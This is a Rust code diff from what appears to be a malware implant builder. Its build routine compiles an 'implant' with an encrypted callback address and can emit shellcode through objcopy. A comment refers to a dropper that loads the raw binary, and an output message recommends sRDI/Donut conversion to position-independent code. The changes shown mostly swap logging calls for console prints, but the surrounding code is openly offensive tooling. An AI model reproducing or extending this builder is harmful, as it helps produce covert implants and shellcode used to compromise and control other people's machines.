@@ -183,19 +183,13 @@ fn build(callback: &str, crate_dir: &str, target: &str, output_name: &str, shell
     } else {
         "release"
     };
-    let profile_dir = if shellcode {
-        "release-shellcode"
-    } else {
-        "release"
-    };
 
-    tracing::info!(
-        "Building {} implant ({}) for {} {}…",
+    crate::ui::print(&format!(
+        "[*] Building {} ({}){}…",
         output_name,
         target,
-        callback,
-        if shellcode { "[SHELLCODE MODE]" } else { "" }
-    );
+        if shellcode { " [SHELLCODE MODE]" } else { "" }
+    ));
 
     let result = Command::new("cargo")
         .env("CALLBACK", &encrypted_callback)
@@ -212,7 +206,7 @@ fn build(callback: &str, crate_dir: &str, target: &str, output_name: &str, shell
     };
     let binary = Path::new("target")
         .join(target)
-        .join(profile_dir)
+        .join(profile)
         .join(bin_name);
 
     let dest = output_dir().join(output_name);
@@ -229,7 +223,10 @@ fn handle_result(status: io::Result<ExitStatus>, src: &Path, dest: &Path) {
         Ok(s) if s.success() => {
             if src.exists() {
                 match fs::copy(src, dest) {
-                    Ok(_) => tracing::info!("Implant written to {}", dest.display()),
+                    Ok(_) => crate::ui::print(&format!(
+                        "[+] Implant written to {}",
+                        dest.display()
+                    )),
                     Err(e) => tracing::error!("Copy failed: {}", e),
                 }
             } else {
@@ -275,18 +272,21 @@ fn handle_shellcode_result(status: io::Result<ExitStatus>, src: &Path, dest: &Pa
                 match objcopy_result {
                     Ok(s) if s.success() => {
                         if let Ok(meta) = fs::metadata(dest) {
-                            tracing::info!(
-                                "Shellcode written to {} ({} bytes)",
+                            crate::ui::print(&format!(
+                                "[+] Shellcode written to {} ({} bytes)",
                                 dest.display(),
                                 meta.len()
-                            );
+                            ));
                         }
                     }
                     _ => {
                         // Fallback : copier le binaire brut (le dropper peut le charger tel quel)
-                        tracing::warn!("objcopy failed, falling back to raw binary copy");
+                        crate::ui::print("[!] objcopy failed, falling back to raw binary copy");
                         match fs::copy(src, dest) {
-                            Ok(_) => tracing::info!("Raw binary written to {}", dest.display()),
+                            Ok(_) => crate::ui::print(&format!(
+                                "[+] Raw binary written to {}",
+                                dest.display()
+                            )),
                             Err(e) => tracing::error!("Copy failed: {}", e),
                         }
                     }
@@ -297,11 +297,11 @@ fn handle_shellcode_result(status: io::Result<ExitStatus>, src: &Path, dest: &Pa
                 match fs::copy(src, dest) {
                     Ok(_) => {
                         if let Ok(meta) = fs::metadata(dest) {
-                            tracing::info!(
-                                "PE shellcode written to {} ({} bytes). Use sRDI/Donut for PIC conversion.",
+                            crate::ui::print(&format!(
+                                "[+] PE written to {} ({} bytes) — use sRDI/Donut for PIC conversion.",
                                 dest.display(),
                                 meta.len()
-                            );
+                            ));
                         }
                     }
                     Err(e) => tracing::error!("Copy failed: {}", e),
